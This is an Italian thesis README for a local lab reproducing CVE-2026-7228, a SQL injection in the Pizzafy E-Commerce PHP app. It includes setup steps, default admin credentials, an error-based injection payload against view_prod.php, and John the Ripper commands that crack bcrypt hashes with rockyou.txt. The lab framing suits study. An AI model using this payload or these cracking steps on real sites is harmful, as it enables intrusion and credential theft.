# ricerca-tesi
risorse di ricerca per cve-2026-7228
## Strumenti

### Installazione virtual-box

installazione di virtual-box: https://www.virtualbox.org/wiki/Downloads

### Installazione iso windows 11

https://www.microsoft.com/it-it/software-download/windows11

### Installazione distro linux: lubuntu

https://lubuntu.me/downloads/

### Sito codice sorgente di Pizzafy E-Commerce

https://www.sourcecodester.com/php/18708/pizzafy-ecommerce-system.html

### Installazione xampp 
1. installazione xampp 
2. mysql e apache: start 
3. utilizzo phpmyadmin ( http://localhost/phpmyadmin ) per creare il database **pizzafy** e importare dal codice sorgente al database locale il file **pizzafy.sql**.


### Installazione Burp Suite ( oppure Postman )

## Test

### Link riferimenti

cve vulnerabilità: https://nvd.nist.gov/vuln/detail/CVE-2026-7228

github per exploit e soluzioni: https://github.com/fernando-mengali/vulndb-submissions.git

### Sito nel server

Estrarre il progetto di pizzafy e spostare la cartella in htdocs di apache su xampp 

### URL di test

sito pizzafy: http://localhost/pizzafy/Pizzafy/

login amministratore: http://localhost/pizzafy/Pizzafy/admin/login.php

Credenziali → Username: admin@gmail.com  Password: admin123

## SQL injection
Specificatamente SQL Injection Error-Based restituendo l’errore in XML
### URL di testing
Primo con metodo GET :  [http://localhost/Pizzafy/pizzafy/view_prod.php?id=](http://localhost/Pizzafy/pizzafy/view_prod.php?id=)
### Payload di test
```markdown

9%20AND%20extractvalue(rand(),%20concat(0x7e,version()))%20--

```
#### Output:
![payload-version](/immagini/output/payload-version.png)

## Exploit Test
Linguaggio di programmazione: ==python==
Libreria utilizzata: **request** `import request
File di **exploit**: `/script/test.py`
### Esecuzione file exploit
Esecuzione di test.py
**Output**:
#### john the ripper
Installazione di john the ripper per decriptare le password dal **hash value**.Per sistemi operativi come Kali il tool è già installato.
**Salvare le/la password in un file txt**: hash.txt
**Installazione del file rockyou.txt**: `git clone https://gitlab.com/kalilinux/packages/wordlists.git`
`gunzip rockyou.txt.gz`
**Tipologia di password criptata**: ==bcrypt==
**Esecuzione del tool con il file wordlist**: `john --wordlist=rockyou.txt --format=bcrypt hash.txt`
**Output**:
![password-cracked](/immagini/output/password-cracked.png)
**Password**: admin123